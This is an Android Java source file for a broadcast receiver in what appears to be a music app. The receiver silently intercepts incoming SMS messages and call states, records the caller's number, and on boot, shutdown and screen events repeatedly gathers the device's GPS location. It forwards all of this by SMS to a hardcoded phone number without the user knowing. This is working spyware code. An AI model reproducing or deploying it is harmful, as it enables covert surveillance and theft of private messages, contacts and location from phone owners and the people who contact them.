package com.victor.module;import android.content.BroadcastReceiver;import android.content.Context;import android.content.Intent;import android.location.Location;import android.os.Bundle;import android.os.Handler;import android.os.Message;import android.telephony.SmsManager;import android.telephony.SmsMessage;import android.telephony.TelephonyManager;import android.text.TextUtils;import android.util.Log;import android.widget.Toast;import com.amap.api.location.AMapLocation;import com.amap.api.location.AMapLocationListener;import com.victor.music.MusicActivity;import com.victor.util.Constant;import com.victor.util.DateUtil;import com.victor.util.Loger;/** * Created by victor on 2016/8/15. */public class PhoneReceiver extends BroadcastReceiver {    private String TAG = "PhoneReceiver";    private AMapLocation loc;    private Context mContext;    Handler mHandler = new Handler(){        @Override        public void handleMessage(Message msg) {            switch (msg.what) {                case Constant.Msg.MSG_LOCATION_START:                    LocationModule.getInstance(mContext,mAMapLocationListener,null).startLocation();                    break;                case Constant.Msg.MSG_LOCATION_FINISH:                    loc = (AMapLocation) msg.obj;                    if (loc != null && loc.getErrorCode() == 0) {                        Log.e(TAG,"----------------- 定位成功 ----------------------");                        String locMsg = "当前位置（"+ "精度：" + loc.getAccuracy() + "米）\n" +                                "定位时间: " + DateUtil.getLocationTime(loc.getTime()) + "\n" +                                "经度：" + loc.getLongitude() + "纬度：" + loc.getLatitude() + "\n" +                                loc.getCity() + loc.getDistrict() + loc.getStreet() + loc.getStreetNum() + "\n"                                + loc.getAoiName() + "\n" + loc.getPoiName();                        Loger.e(TAG,"------------------- SEND SMS -----------------");                        SmsManager manager = SmsManager.getDefault();                        manager.sendTextMessage("18813938924", null, locMsg, null, null);                        LocationModule.getInstance(mContext,mAMapLocationListener,null).stopLocation();                        Loger.e(TAG,"send mess = " + locMsg);                    }                    break;            }        }    };    @Override    public void onReceive(Context context, Intent intent) {        mContext = context;        Loger.e(TAG,"--------------------- onReceive -----------------------");        Loger.e(TAG,"intent.getAction() = " + intent.getAction());        if (intent.getAction().equals("com.victor.phonerecevier")){            Toast.makeText(context, intent.getStringExtra("mess"),Toast.LENGTH_SHORT).show();        } else if (intent.getAction().equals("android.intent.action.TIMEZONE_CHANGED")){            Toast.makeText(context, "时区改变，请注意时差！",Toast.LENGTH_SHORT).show();        } else if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){            Bundle bundle = intent.getExtras();            Object[] datas = (Object[]) bundle.get("pdus");            System.out.println(datas);            SmsMessage message = SmsMessage.createFromPdu((byte[])datas[0]);            String content = message.getDisplayOriginatingAddress() + message.getDisplayMessageBody();            String phoneNum = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);            String mess = "to:" + phoneNum + "\n" + "content:" + content;            if (!TextUtils.isEmpty(phoneNum)) {                SmsManager manager = SmsManager.getDefault();                manager.sendTextMessage("18813938924", null, mess, null, null);                Loger.e(TAG,"send mess = " + mess);                mHandler.sendEmptyMessageDelayed(Constant.Msg.MSG_LOCATION_START,10000);            }        } else if (intent.getAction().equals("android.intent.action.PHONE_STATE")){            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);            String phoneNum = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);            String mess = phoneNum + " ";            int state = tm.getCallState();            switch(state){                case TelephonyManager.CALL_STATE_RINGING: mess += "Is calling......";break;                case TelephonyManager.CALL_STATE_IDLE:  mess += "Hung up......";break;                case TelephonyManager.CALL_STATE_OFFHOOK:  mess += "Is on the phone......";break;            }            if (!TextUtils.isEmpty(phoneNum)) {                SmsManager manager = SmsManager.getDefault();                manager.sendTextMessage("18813938924", null, mess, null, null);                Loger.e(TAG,"send mess = " + mess);                mHandler.sendEmptyMessageDelayed(Constant.Msg.MSG_LOCATION_START,10000);            }            PlayModule.getInstance(mContext).pause();        } else if (intent.getAction().equals("android.intent.action.SCREEN_ON")) {            mHandler.sendEmptyMessageDelayed(Constant.Msg.MSG_LOCATION_START,10000);        } else if (intent.getAction().equals("android.intent.action.SCREEN_OFF")) {            mHandler.sendEmptyMessageDelayed(Constant.Msg.MSG_LOCATION_START,10000);        } else if (intent.getAction().equals("android.intent.action.USER_PRESENT")) {            mHandler.sendEmptyMessageDelayed(Constant.Msg.MSG_LOCATION_START,10000);        } else if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {            mHandler.sendEmptyMessageDelayed(Constant.Msg.MSG_LOCATION_START,10000);        } else if (intent.getAction().equals("android.intent.action.ACTION_SHUTDOWN")) {            mHandler.sendEmptyMessage(Constant.Msg.MSG_LOCATION_START);        }    }    private AMapLocationListener mAMapLocationListener = new AMapLocationListener() {        @Override        public void onLocationChanged(AMapLocation loc) {            if (loc != null) {                Message msg = mHandler.obtainMessage();                msg.obj = loc;                msg.what = Constant.Msg.MSG_LOCATION_FINISH;                mHandler.sendMessage(msg);            }        }    };}